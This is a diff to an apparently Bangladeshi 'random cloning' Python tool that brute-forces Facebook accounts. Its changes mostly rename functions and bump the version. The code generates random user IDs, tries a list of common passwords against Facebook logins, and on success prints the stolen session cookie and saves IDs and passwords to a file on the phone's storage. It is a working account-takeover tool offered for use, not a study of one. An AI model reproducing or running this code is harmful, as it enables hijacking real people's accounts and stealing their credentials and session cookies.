@@ -126,7 +126,7 @@ logo=("""
 ║\x1b[97m\033[37;41m Welcome to my REX Tools\033[0;m  ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m  PAID BANGLADESHI RANDOM CLONING V1 \033[0;m    ║
+║  \x1b[97m\033[37;41m  PAID BANGLADESHI RANDOM CLONING V1.1 \033[0;m    ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 \33[1;92m║➣\033[1;91m DEVOLPER      : Ruhul Xmin\33[1;92m               
@@ -169,7 +169,7 @@ def Main():
 	print(54*'━')
 	opt = input('Choose option >>> ')
 	if opt in ["A","1"]:
-		RXB()
+		REX()
 	if opt in ["B","2"]:
 		import os; import time; os.system('xdg-open https://facebook.com/ruhul.xmin.bokxi'); time.sleep(1)
 		admin()
@@ -201,7 +201,7 @@ def admin():
 		admin()
 	if bal =='0':
 		Main()
-def RXB ():
+def REX ():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -226,7 +226,7 @@ def RXB ():
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda + kodb + guru, kodb + guru, kode + koda + kodb, kode + kode, kode + '@#', '@kode', kode + '123', kode + '1234', 'FREE FIRE', 'free fire', 'i love you', 'freefire', 'iloveyou']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'@#','@kode',kode+'123',kode+'1234','FREE FIRE','free fire','i love you','freefire','iloveyou']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [💉] Crack process has been completed')
@@ -242,7 +242,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRXB\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mREX\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -277,10 +277,10 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [RXB-💚] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [REX-💚] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/RXB-OK💥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/REX-OK💥.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
